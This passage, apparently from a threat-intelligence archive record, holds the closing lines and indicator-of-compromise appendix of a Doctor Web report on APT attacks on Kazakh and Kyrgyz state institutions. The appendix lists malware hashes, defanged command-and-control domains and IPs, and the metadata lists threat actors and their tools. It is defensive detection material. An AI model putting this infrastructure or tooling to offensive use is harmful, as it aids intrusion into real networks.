adequate counteraction measures. Doctor Web not only\ncreates anti-virus protection software, but also provides an investigation [service for virus-](https://antifraud.drweb.com/expertise/)\nrelated computer incidents, which include targeted attacks. If malicious activity within a\ncorporate network is suspected, the best option is to contact the Doctor Web virus\nlaboratory for qualified help. An early response will help minimize damage and prevent the\nworst consequences of targeted computer attacks.\n\n\n-----\n\n### Appendix. Indicators of Compromise\n\n##### SHA1 hashes\n\n**Exploit.RTF**\n\na707de5a277573b8080e2147bd99ec1015cf56c5: doc.rtf\n\n**BackDoor.Apper**\n\n48944207135ffbf0a3edf158e5fe96888a52fada: dropper\n\n23dbe50d3484ba906a2fd4b7944d62fb4da42f95: RasTls.dll\n\n5b041bce8559334dc9e819c72da9ff888d7e39c9: shellcode\n\n**BackDoor.CmdUdp**\n\n314b259739f4660e89221fa2e8990139a84611a9: dnscache.dll\n\n**BackDoor.Logtu**\n\n7797107eb4a9a9e4359413c15999603fa27714b3: logsupport.dll\n\n**BackDoor.Mikroceen**\n\n2930efc03e958479568e7930f269efb1e2bcea5a: nwsapagent.dll\n\n56000aa9a70ff3c546dab3c2a3b19021636b3b9c: nwsapagenttt.dll\n\ne98f3b43ab262f4c4e148e659cc615a0612d755f: srv.dll\n\n**BackDoor.PlugX**\n\nb03c98a9539d4cbb17f2efc118c4b57882b96d93: CLNTCON.ocx\n\nb7eac081c814451791f0cd169d0c6a525a05194d: CLNTCON.ocx\n\n9a2d98321356ad58ea6c8a7796fd576e76237bd1: CLNTCON.ocx\n\nec548ba0ec9d2452c30e9ef839eb6582a4b685c8: CLNTCON.ocp\n\n7bcb10f1ed9b41abbbe468d177cd46991c224315: ESETSrv\n\n\n-----\n\nd52152661c836e76bebd46046ba3f877c5d381d8: http_dll.dll\n\n1ba85de14f85389bf3194acea865f4c819d7b602: QuickHeal\n\n8d5e7d389191a3de73350d444c3989857077f629: QuickHeal\n\naa0e7101b1663c23f980598ca3d821d7b6ea342d: scansts.dll\n\n84c34167a696533cc7eddb5409739edd9af232ed: msvsct.exe\n\n2c51147b271d691f0ab040f62c821246604d3d81: msvsct.ini\n\n2e2919ce6f643d73ff588bccdc7da5d74c611b2c: msvsct.ini\n\n6fc2e76a0d79cc2a78a8d73f63d2fc433ede8bd5: RasTls.dll\n\ne6381d09cdf15973f952430e70547d0b88bb1248: decrypted\n\nf6bf976a2fdef5a5a44c60cbfb0c8fcbdc0bae02: decrypted\n\n**BackDoor.Whitebird**\n\ne70a5ce00b3920d83810496eab6b0d028c5f746e: oci.dll\n\nc47883f01e51a371815fc86f2adbfb16ffb3cb8a: RasTls.dll\n\n6fc2e76a0d79cc2a78a8d73f63d2fc433ede8bd5: RasTls.dll\n\n**BackDoor.Zhengxianma**\n\ncce4ba074aa690fc0e188c34f3afff402602921a: RasTls.dll\n\n**Trojan.Mirage**\n\n34085c6d935c4df7ce7f80297b0c14a8d3b436d8: cmdl32.dat\n\nf5fe30ee6e2de828c7a6eecbb7f874dc35d31f43: config.dat\n\nc4ef5981bee97c78d29fb245d84146a5db710782: rapi.dll\n\nd4558761c52027bf52aa9829bbb44fe12920381d: server.dll\n\n**Trojan.Misics**\n\nc90ade97ec1c6937aedeced45fd643424889d298: MISICS.dll\n\n5b8f28a5986612a41a34cb627864db80b8c4b097: MISICS.dll.crt\n\n\n-----\n\n**Trojan.XPath**\n\n3e1d66ea09b7c4dbe3c6ffe58262713806564c17: svchost.exe\n\nb6fba9877ad79ce864d75b91677156a33a59399e: yyyyyyyygoogle.sys\n\n8cc16ad99b40ff76ae68d7b3284568521e6413d9: yyyyyyyygoogle.sys\n\n5c21ce425ff906920955e13a438f64f578635c8f: yyyyyyyygoogle.sys\n\ne4e365cc14eeeba5921d385b991e22dea48a1d75: PayloadDll.dll\n\nb07568ef80462faac7da92f4556d5b50591ca28d: PayloadDll.dll\n\nfc4844a6f9b5c76abc1ec50b93597c5cfde46075: xPath.dll\n\n2bf5cfe30265a99c13f5adad7dd17ccb9db272e0: xPath64.dll\n\n**Tool.Proxy**\n\na1c6958372cd229b8a75a09bdff8d72959bb6053: cryptsocket.exe\n\n30debaf4ec160c00958470d9b295247c86595067: vmwared.exe\n\n**Tool.Scanner**\n\n05a2b543b5a3a941c7ad9e6bff2a101dc2222cb2: m17.exe\n\n**Tool.WmiExec**\n\n8675e4c54a35b64e6fee3d8d7ad500f618e1aac9: wmi.vbs\n\n##### Domains\n\ntv[.]teldcomtv[.]com\n\ndns03[.]cainformations[.]com\n\nwww[.]sultris[.]com\n\nkkkfaster[.]jumpingcrab[.]com\n\nwww[.]pneword[.]net\n\nv[.]nnncity[.]xyz\n\n\n-----\n\nnicodonald[.]accesscam[.]org\n\n##### IPs\n\n45.32.184[.]101\n\n45.63.114[.]127\n\n45.77.234[.]118\n\n45.251.241[.]26\n\n46.105.227[.]110\n\n46.166.129[.]241\n\n103.93.76[.]27\n\n104.194.215[.]199\n\n114.116.8[.]198\n\n116.206.94[.]68\n\n137.175.79[.]212\n\n142.252.249[.]25\n\n202.74.232[.]2\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.07.20.APT_attacks_Kazakhstan_Kyrgyzstan/Study_of_the_APT_attacks_on_state_institutions_in_Kazakhstan_and_Kyrgyzstan_en.pdf",
        "https://st.drweb.com/static/new-www/news/2020/july/Study_of_the_APT_attacks_on_state_institutions_in_Kazakhstan_and_Kyrgyzstan_en.pdf"
    ],
    "report_names": [
        "Study_of_the_APT_attacks_on_state_institutions_in_Kazakhstan_and_Kyrgyzstan_en",
        "Study_of_the_APT_attacks_on_state_institutions_in_Kazakhstan_and_Kyrgyzstan_en.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5d9dfc61-6138-497a-b9da-33885539f19c",
            "created_at": "2022-10-25T16:07:23.720008Z",
            "updated_at": "2025-03-27T02:02:09.944484Z",
            "deleted_at": null,
            "main_name": "Icefog",
            "aliases": [
                "ATK 23",
                "Dagger Panda",
                "Icefog",
                "Red Wendigo"
            ],
            "source_name": "ETDA:Icefog",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Dagger Three",
                "Fucobha",
                "Icefog",
                "Javafog",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1aead86d-0c57-4e3b-b464-a69f6de20cde",
            "created_at": "2023-01-06T13:46:38.318176Z",
            "updated_at": "2025-03-27T02:00:02.803684Z",
            "deleted_at": null,
            "main_name": "DAGGER PANDA",
            "aliases": [
                "IceFog",
                "RedFoxtrot",
                "Red Wendigo",
                "PLA Unit 69010"
            ],
            "source_name": "MISPGALAXY:DAGGER PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3c7097f4-849b-4bc0-a7e6-ba2b510722b6",
            "created_at": "2022-10-25T16:07:23.869951Z",
            "updated_at": "2025-03-27T02:02:10.003542Z",
            "deleted_at": null,
            "main_name": "Mikroceen",
            "aliases": [
                "SixLittleMonkeys"
            ],
            "source_name": "ETDA:Mikroceen",
            "tools": [
                "AngryRebel",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "Microcin",
                "Mikroceen",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "PCRat",
                "logon.dll",
                "logsupport.dll",
                "pcaudit.bat",
                "sqllauncher.dll"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041804,
    "ts_creation_date": 1595260396,
    "ts_modification_date": 1595260396,
    "files": {
        "pdf": "https://archive.orkl.eu/7ff8651fcdf8d0213257d3bf05b729b9c11d34b1.pdf",
        "text": "https://archive.orkl.eu/7ff8651fcdf8d0213257d3bf05b729b9c11d34b1.txt",
        "img": "https://archive.orkl.eu/7ff8651fcdf8d0213257d3bf05b729b9c11d34b1.jpg"
    }
}